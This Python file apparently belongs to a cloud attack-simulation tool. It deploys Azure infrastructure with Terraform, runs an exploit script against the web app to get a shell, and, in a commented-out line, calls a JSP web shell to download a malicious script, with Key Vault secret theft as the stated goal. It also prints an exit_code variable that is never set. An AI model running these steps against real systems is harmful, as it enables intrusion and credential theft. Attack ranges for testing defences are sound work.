import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
from core.helpers import generate_ssh_key

def scenario_6_execute():
    print("-"*30)
    print(colored("Executing Scenraio 6 : Azure Web Exploit, Abuse Managed Identity, Extract Secrets from Key Vault", color="red"))
    loading_animation()
    print("-"*30)

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)

    subprocess.call("cd ./scenarios/scenario_6/infra/ && terraform init && terraform apply --auto-approve", shell=True)
    subprocess.call("cd ./scenarios/scenario_6/infra/ && terraform output -json >> ../../../core/cobra-scenario-6-output.json", shell=True)

    with open("./core/cobra-scenario-6-output.json", "r") as file:
        data = json.load(file)
    
    VM_IP = data["vm_public_ip"]["value"] 
    VAULT_NAME = data["vault_name"]["value"]

    print(colored("Exploiting Web App & Creating a Shell", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call("sh scenarios/scenario_6/exploit "+VM_IP+":8081", shell=True)

    print(colored("Download malicious script into remote machine", color="red"))
    loading_animation()
    print("-"*30)
    #exit_code = subprocess.call(f"curl --silent --output - 'http://{VM_IP}:8081/shell.jsp?cmd=curl'", shell=True)
    print("Exit Code: "+ str(exit_code))
    # print(colored("Deploying Web App and service", color="red"))
    # loading_animation()
    # sleep_duration = 60
    # with tqdm(total=sleep_duration, desc="Loading") as pbar:
    #     while sleep_duration > 0:
    #         sleep_interval = min(1, sleep_duration)
    #         sleep(sleep_interval)

    #         pbar.update(sleep_interval)
    #         sleep_duration -= sleep_interval    


    